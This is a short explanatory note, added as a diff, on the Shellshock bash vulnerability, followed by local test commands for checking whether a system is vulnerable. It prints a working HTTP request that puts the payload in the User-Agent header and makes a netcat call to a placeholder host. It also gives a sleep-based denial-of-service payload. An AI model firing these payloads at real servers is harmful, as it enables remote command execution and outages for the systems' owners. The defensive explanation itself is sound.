@@ -1,0 +1,40 @@
+SHELLSHOCK!
+
+
+This vulnerability plays off the vulnerability that was in BASH that allwoed for RCE to be acheived through the unintentional execution of bash commands after the legitimate function call from an ENV that was created as part of a CGI call. 
+
+
+GET /cgi-bin/status HTTP/1.1
+Host: vuln.host
+Accept: application/json, text/javascript, */*; q=0.01
+User-Agent: () { :;}; /usr/bin/nc vuln.ip 6000
+X-Requested-With: XMLHttpRequest
+Referer: reffered.source
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+Here we can see and example of shell shock placed in a Header of a request. Here in the User-Agent that will be passed via a CGI script in an ENV via Bash to the system. 
+
+()    a start of a new function           { :;}   empty function body          ;      end of Function                    /usr/bin/nc    vuln.ip 6000           arbitrary call to netcat\
+
+This is a DOS payload:
+
+new_function() { :;}  ;  /bin/sleep 20  | /sbin/sleep 20  | /usr/bin/sleep 20
+
+note it is calling multiple sleep binaries using [|] OR to enhance the chance of an available sleep binary.
+
+So how can we check our system? 
+
+Here is a handy tool:
+
+https://github.com/hannob/bashcheck
+
+Or
+
+use these commands to check directly in command line :
+
+
+env X=”() { :;} ; echo Bash is Infected” /bin/sh -c “echo completed” 
+env X=”() { :;} ; echo Bash is Infected” `which bash` -c “echo completed”
+env VAR='() { :;}; echo Bash is Infected‘ bash -c “echo completed”
